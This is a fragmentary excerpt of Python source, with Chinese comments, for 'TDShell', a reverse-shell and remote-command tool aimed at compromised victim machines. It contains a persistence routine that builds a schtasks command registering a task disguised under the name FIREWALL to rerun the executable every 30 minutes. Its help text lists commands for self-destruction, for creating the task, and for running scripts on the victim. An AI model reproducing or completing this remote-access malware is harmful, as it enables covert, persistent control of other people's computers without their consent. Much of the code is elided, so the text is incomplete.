...
TDShell主要用于建立TCP连接，反弹Shell，远程执行命令
			...
			try:
				...
				if response=='playtask':        #给自己创建计划任务！
					try:
						...
						command='schtasks.exe  /Create /RU '+'"'+name+'"'+' /SC MINUTE /MO 30 /TN FIREWALL /TR '+'"'+path+'\\TDShell.exe'+'"'+' /ED 2016/12/12'  #可执行文件一定要写绝对路径
						#以上这条为添加一条计划任务的命令！！！
...
def mains():
	...
	if len(sys.argv)>3:
		...
		if type_s=='-l':#-listen
			...
			print '[HELP]  TDShell.exe [-l（listen）/-s (slave)] [ip] [port]'
			print '[HELP]  python TDShell.TD [-l（listen）/-s (slave)] [ip] [port]'
			print u'connection：'
			print u'[HELP]  exit    ----退出连接'
			print u'[HELP]  kill    ----退出连接并自毁程序'
			print u'[HELP]  playtask    ----创建计划任务'
			print u'[HELP]  python -p file.py    ----在肉鸡上执行本地TDthon脚本'
	else:
		print '[HELP]  TDShell.exe [-l（listen）/-s (slave)] [ip] [port]'
		print '[HELP]  python TDShell.py [-l（listen）/-s (slave)] [ip] [port]'
		print u'connection：'
		print u'[HELP]  exit    ----退出连接'
		print u'[HELP]  kill    ----退出连接并自毁程序'
		print u'[HELP]  playtask    ----创建计划任务'
